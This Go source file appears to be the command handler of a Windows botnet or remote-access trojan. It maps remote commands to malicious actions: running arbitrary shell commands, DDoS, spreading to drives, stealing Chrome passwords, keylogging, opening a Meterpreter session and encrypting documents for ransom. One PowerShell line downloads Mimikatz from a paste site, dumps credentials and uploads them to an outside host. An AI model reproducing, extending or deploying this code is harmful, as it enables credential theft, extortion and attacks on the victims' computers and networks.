package main

import "strings"
import "github.com/sqweek/dialog"

/*
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
*/
import "C"

func Execute(command string, target string, args string) {
	if target == "*" || target == GetUsername() {
		switch command {
		case "cmd":
			Run(args)
		case "off":
			Run("shutdown /p /f")
		case "lo":
			Run("shutdown /l /f")
		case "kill":
			Run("taskkill /IM " + args + " /T /f")
		case "msg":
			Run("msg * " + strings.Replace(args, "-", " ", -1))
		case "yn":
			title := "Alert"
			var text string
			//If title passed
			if len(strings.Split(args, ";")) > 1 {
				title = strings.Split(args, ";")[1]
				text = strings.Replace(strings.Split(args, ";")[0], "-", " ", -1)
			} else {
				text = strings.Replace(args, "-", " ", -1)
			}
			res := dialog.Message("%s", text).Title(title).YesNo()
			if res == true {
				Send("yn", GetUsername()+" responds yes")
			} else {
				Send("yn", GetUsername()+" responds no")
			}

		case "web":
			Run("start " + args) //  Use /MIN to start minimized
		case "ddos":
			DdosApi(100, args)
		case "sdd":
			StopDdos()
		case "inf":
		case "infect":
			CopyToDrives()
		case "pass":
			Send("pass", GetChromePassString())
		case "autoInf":
			AutoInfect()
		case "stopAutoInf":
			StopAutoInfect()
		case "upgrade":
			Upgrade(args)
		case "uninstall":
			Uninstall()
		case "getav":
			Send("res", GetAV())
		case "meterpreter":
			Meterpreter(strings.Split(args, ":")[0], strings.Split(args, ":")[1])
		case "start-keylogger":
			keyLogger()
		case "keylog":
			Send("res", tmpKeylog)
		case "please":
			Please(args)
		case "mimi":
			Run(`powershell "IEX (New-Object Net.WebClient).DownloadString('https://paste.ee/r/0ZlX2'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('http://` + GetIp() + `', 'POST' , $output)"`)
		case "ransom":
			EncryptExternalDrives(true)
			EncryptDocumets("C:\\", true)
			//Encrypt net drives

			// Once encrypted
			//WriteRegDone()
			// Write done to pastebin
			PromtPay()

			//ListenForPayment()

		default:
			Send("res", "Not a command")
		}
	}
}
